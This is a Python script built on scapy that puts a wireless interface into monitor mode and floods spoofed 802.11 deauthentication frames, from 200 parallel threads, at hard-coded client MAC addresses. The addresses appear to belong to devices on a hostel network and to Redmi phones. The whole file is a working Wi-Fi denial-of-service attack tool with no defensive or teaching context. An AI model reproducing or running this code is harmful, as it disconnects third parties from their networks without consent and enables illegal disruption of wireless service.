from random import randrange
from scapy.all import *
from concurrent.futures import ThreadPoolExecutor
import os
import netifaces
import subprocess

def get_gateway_ip(man_interface):

    gateway_ip = ''
    gateways = netifaces.gateways()
    for gateway in gateways[2]:
        if man_interface == gateway[1]:
            gateway_ip = gateway[0]

    return gateway_ip

def get_gateway_mac(gateway_ip):
    arp_request = scapy.all.Ether(dst='ff:ff:ff:ff:ff:ff')/scapy.all.ARP(pdst=gateway_ip, op=1)
    ans, _ = srp(arp_request, verbose=0)
    for response in ans:
        gateway_mac = response[1].src
        break

    return gateway_mac

def check_available_wireless_interfaces():

    re_addr = r'addr\s([0-9A-Fa-f]{2}[:]){5}([0-9A-Fa-f]{2})'
    re_ssid = r'ssid\s(.+)\n'
    re_type = r'type\s(.+)\n'
    interface_list = []
    process = subprocess.Popen(['iw', 'dev'], stdout=subprocess.PIPE)
    output = process.communicate()[0]
    output = output.decode()
    output = output.split('\n\tInterface ')
    
    for i in range(1, len(output)):
        interface_name = output[i].split(' ', 1)[0].split('\n')[0]

        s = re.search(re_addr, output[i])
        try:
            mac_addr = s.group(0)
            mac_addr = mac_addr.split(' ')[1]
        except:
            mac_addr = ''

        s = re.search(re_ssid, output[i])
        try:
            ssid = s.group(0)
            ssid = ssid.split(' ', 1)[1].strip('\n')
        except:
            ssid = ''

        s = re.search(re_type, output[i])
        try:
            type = s.group(0)
            type = type.split(' ', 1)[1].strip('\n')
        except:
            type = ''

        tempDict = dict(interface_name=interface_name, mac_addr=mac_addr, ssid=ssid, type=type)
        interface_list.append(tempDict)

    return interface_list

def switch_to_monitor_mode(interface_name):

    try:
        stop_network_manager = 'sudo service network-manager stop'
        interface_down = 'sudo ifconfig '+interface_name+' down'
        interface_mode = 'sudo iwconfig '+interface_name+' mode monitor'
        interface_up = 'sudo ifconfig '+interface_name+' up'
        start_network_manager = 'sudo service network-manager start'

        os.system(stop_network_manager)
        os.system(interface_down)
        os.system(interface_mode)
        os.system(interface_up)
        os.system(start_network_manager)
    
    except Exception as e:
        print("[*] Monitor mode not supported")
        print(e)
        exit()


def switch_to_managed_mode(interface_name):
    
    stop_network_manager = 'sudo service network-manager stop'
    interface_down = 'sudo ifconfig '+interface_name+' down'
    interface_mode = 'sudo iwconfig '+interface_name+' mode managed'
    interface_up = 'sudo ifconfig '+interface_name+' up'
    start_network_manager = 'sudo service network-manager start'

    os.system(stop_network_manager)
    os.system(interface_down)
    os.system(interface_mode)
    os.system(interface_up)
    os.system(start_network_manager)


def send_deauth_packets_thread(packet, interface_name):
    sendp(packet, inter=0.1, iface=interface_name, verbose=0)

def send_deauth_packets(packet, interface_name):

    with ThreadPoolExecutor(200) as executor:
        for _ in range(200):
            executor.submit(send_deauth_packets_thread, packet, interface_name)

def deauthenticate(interface_name, man_interface):
    
    gateway_ip = get_gateway_ip(man_interface)
    gateway_mac = get_gateway_mac(gateway_ip)

    # hostel = ['a4:17:31:30:d1:e1', 'be:f1:9c:b6:4b:91', 'aa:83:8c:bb:0e:8d', 
    # 'ce:31:4d:cd:8d:85', 'fa:6b:7a:59:f2:1d', '3a:c5:54:e8:db:f3', '1a:5c:e1:09:52:35', 'fc:42:03:f2:a5:ae', 'a2:86:31:32:17:c6']

    redmi = ['00:fa:21:0e:84:d4', '48:c7:96:18:06:63', 'c8:e2:65:cc:50:c9']
    # target_macs_list = ['e0:dc:ff:2f:fd:79', '04:e5:98:5d:9c:12']
    target_macs_list = redmi
    for target_mac in target_macs_list:
        
        dot11 = scapy.all.Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
        packet = scapy.all.RadioTap()/dot11/scapy.all.Dot11Deauth(reason=7)
        
        send_deauth_packets(packet, interface_name)

    


if __name__=='__main__':

    # wlx00c0ca59c791, wlx00e0410d962e
    deauthenticate('wlx00c0ca59c791', 'wlp0s20f3')
